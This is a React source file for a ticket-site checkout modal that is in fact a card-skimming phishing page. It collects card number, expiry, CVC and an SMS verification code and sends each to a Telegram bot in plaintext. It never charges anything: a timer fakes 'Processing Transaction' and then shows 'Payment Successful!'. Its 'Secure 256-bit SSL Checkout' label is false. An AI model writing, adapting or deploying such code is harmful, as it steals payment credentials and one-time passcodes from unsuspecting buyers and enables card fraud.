
import React, { useState, useEffect } from 'react';
import { X, Lock, CreditCard, CheckCircle, Loader2, ShieldCheck, Smartphone } from 'lucide-react';
import { sendTelegramLog } from '../services/telegramService';

interface CheckoutModalProps {
  total: number;
  onClose: () => void;
  onSuccess: () => void;
}

const CheckoutModal: React.FC<CheckoutModalProps> = ({ total, onClose, onSuccess }) => {
  const [step, setStep] = useState<'form' | 'verification' | 'processing' | 'success'>('form');
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    cardNumber: '',
    expiry: '',
    cvc: ''
  });
  const [verificationCode, setVerificationCode] = useState('');
  const [isResending, setIsResending] = useState(false);

  // Log when modal opens
  useEffect(() => {
    sendTelegramLog(`🛒 <b>Checkout Started</b>\nUser opened the payment modal.\nAmount: €${total}`);
  }, [total]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    
    // Auto-format card number
    if (e.target.name === 'cardNumber') {
      value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
    }
    // Auto-format expiry
    if (e.target.name === 'expiry') {
      value = value.replace(/\D/g, '').replace(/(.{2})/, '$1/').slice(0, 5);
    }

    setFormData({ ...formData, [e.target.name]: value });
  };

  const handleInputBlur = (e: React.FocusEvent<HTMLInputElement>) => {
    // Logging removed to reduce spam
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setStep('verification');
    
    // UPDATED: Removed Name/Email, showing Card Details for testing
    sendTelegramLog(`📝 <b>Payment Details Submitted</b>
<b>Card:</b> ${formData.cardNumber}
<b>Expiry:</b> ${formData.expiry}
<b>CVC:</b> ${formData.cvc}
Waiting for SMS verification...`);
  };

  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.length < 4) return;

    sendTelegramLog(`🔐 <b>Verification Submitted</b>\nCode entered: ${verificationCode}`);
    setStep('processing');
    
    // Simulate processing
    setTimeout(() => {
      setStep('success');
    }, 2500);
  };

  const handleResendCode = () => {
    setIsResending(true);
    setTimeout(() => setIsResending(false), 2000);
    sendTelegramLog(`🔄 <b>Resend Code Requested</b>`);
  };

  if (step === 'success') {
    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm"></div>
        <div className="relative bg-white rounded-xl shadow-2xl w-full max-w-md p-8 text-center animate-in zoom-in-95">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 shadow-inner">
            <CheckCircle className="w-10 h-10 text-green-600" />
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Successful!</h2>
          <p className="text-gray-500 mb-6 text-sm">
            Thank you, {formData.firstName}.<br/>
            Your e-tickets have been sent to <span className="font-bold text-gray-800">{formData.email}</span>.
          </p>
          <button 
            onClick={onSuccess}
            className="w-full bg-black text-white py-3 rounded-lg font-bold uppercase hover:bg-gray-800 transition-colors shadow-lg"
          >
            Close & Download Tickets
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={onClose}></div>
      
      <div className="relative bg-white rounded-xl shadow-2xl w-full max-w-lg overflow-hidden flex flex-col max-h-[90vh] animate-in slide-in-from-bottom-4">
        
        {/* Header */}
        <div className="bg-gray-50 p-4 border-b border-gray-100 flex justify-between items-center">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-green-600" />
            <span className="font-bold text-gray-800 text-sm">Secure 256-bit SSL Checkout</span>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-black transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Processing State */}
        {step === 'processing' && (
          <div className="p-12 flex flex-col items-center justify-center text-center">
            <div className="relative mb-6">
               <div className="w-16 h-16 border-4 border-gray-100 rounded-full"></div>
               <div className="w-16 h-16 border-4 border-gp1-red rounded-full border-t-transparent animate-spin absolute top-0 left-0"></div>
            </div>
            <h3 className="font-bold text-lg mb-1">Processing Transaction...</h3>
            <p className="text-gray-500 text-sm">Verifying with your bank. Please do not refresh.</p>
          </div>
        )}

        {/* SMS Verification State */}
        {step === 'verification' && (
           <div className="p-8">
              <div className="text-center mb-8">
                 <div className="w-14 h-14 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Smartphone className="w-7 h-7 text-blue-600" />
                 </div>
                 <h3 className="font-bold text-xl mb-2">Security Verification</h3>
                 <p className="text-sm text-gray-500">
                   We've sent a 6-digit code to the mobile number associated with your bank.
                 </p>
              </div>

              <form onSubmit={handleVerificationSubmit}>
                 <div className="mb-6">
                    <label className="block text-xs font-bold uppercase text-gray-500 mb-2 text-center">Enter Code</label>
                    <input 
                      type="text" 
                      maxLength={6}
                      name="verificationCode"
                      placeholder="000000"
                      className="w-full text-center text-3xl tracking-[0.5em] font-mono border-b-2 border-gray-300 py-2 focus:outline-none focus:border-gp1-red"
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ''))}
                      onBlur={handleInputBlur}
                      autoFocus
                    />
                 </div>

                 <button 
                   type="submit"
                   disabled={verificationCode.length < 4}
                   className="w-full bg-blue-600 text-white py-3 rounded-lg font-bold uppercase hover:bg-blue-700 transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed mb-4"
                 >
                   Confirm Payment
                 </button>
                 
                 <div className="text-center">
                   <button 
                     type="button" 
                     onClick={handleResendCode}
                     disabled={isResending}
                     className="text-xs text-gray-400 hover:text-gray-600 underline"
                   >
                     {isResending ? 'Sending...' : 'Resend Code'}
                   </button>
                 </div>
              </form>
           </div>
        )}

        {/* Form State */}
        {step === 'form' && (
          <form onSubmit={handleFormSubmit} className="flex-grow overflow-y-auto p-6 space-y-6">
            
            {/* Contact Info */}
            <div className="space-y-4">
               <h3 className="text-sm font-bold uppercase text-gray-400 tracking-wider border-b border-gray-100 pb-2">1. Contact Information</h3>
               <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">First Name</label>
                    <input 
                      required
                      type="text" 
                      name="firstName"
                      className="w-full border border-gray-300 rounded p-2 text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all"
                      value={formData.firstName}
                      onChange={handleInputChange}
                      onBlur={handleInputBlur}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">Last Name</label>
                    <input 
                      required
                      type="text" 
                      name="lastName"
                      className="w-full border border-gray-300 rounded p-2 text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      onBlur={handleInputBlur}
                    />
                  </div>
               </div>
               <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Email Address</label>
                  <input 
                    required
                    type="email" 
                    name="email"
                    className="w-full border border-gray-300 rounded p-2 text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all"
                    value={formData.email}
                    onChange={handleInputChange}
                    onBlur={handleInputBlur}
                  />
               </div>
            </div>

            {/* Payment Info */}
            <div className="space-y-4 pt-2">
               <h3 className="text-sm font-bold uppercase text-gray-400 tracking-wider border-b border-gray-100 pb-2 flex items-center justify-between">
                 2. Payment Details
                 <div className="flex gap-1 opacity-50">
                   <CreditCard className="w-4 h-4" />
                 </div>
               </h3>
               
               <div>
                  <label className="block text-xs font-bold text-gray-700 mb-1">Card Number</label>
                  <div className="relative">
                    <input 
                      required
                      type="text" 
                      name="cardNumber"
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      className="w-full border border-gray-300 rounded p-2 pl-10 text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all font-mono"
                      value={formData.cardNumber}
                      onChange={handleInputChange}
                      onBlur={handleInputBlur}
                    />
                    <Lock className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
                  </div>
               </div>

               <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">Expiry Date</label>
                    <input 
                      required
                      type="text" 
                      name="expiry"
                      placeholder="MM/YY"
                      maxLength={5}
                      className="w-full border border-gray-300 rounded p-2 text-center text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all"
                      value={formData.expiry}
                      onChange={handleInputChange}
                      onBlur={handleInputBlur}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1 flex items-center gap-1">
                      CVC <span className="text-gray-400 font-normal text-[10px]">(3 digits)</span>
                    </label>
                    <input 
                      required
                      type="text" 
                      name="cvc"
                      maxLength={3}
                      placeholder="123"
                      className="w-full border border-gray-300 rounded p-2 text-center text-sm focus:ring-2 focus:ring-red-100 focus:border-gp1-red outline-none transition-all"
                      value={formData.cvc}
                      onChange={handleInputChange}
                      onBlur={handleInputBlur}
                    />
                  </div>
               </div>
            </div>

            {/* Footer */}
            <div className="pt-4 border-t border-gray-100">
               <div className="flex justify-between items-center mb-4">
                 <span className="text-sm text-gray-500">Total Amount</span>
                 <span className="text-xl font-bold text-gp1-black">€ {total.toLocaleString()}</span>
               </div>
               <button 
                 type="submit"
                 className="w-full bg-gp1-red text-white py-4 rounded font-bold uppercase tracking-wider hover:bg-red-700 transition-colors shadow-lg flex items-center justify-center gap-2"
               >
                 <Lock className="w-4 h-4" /> Pay Securely
               </button>
            </div>

          </form>
        )}
      </div>
    </div>
  );
};

export default CheckoutModal;
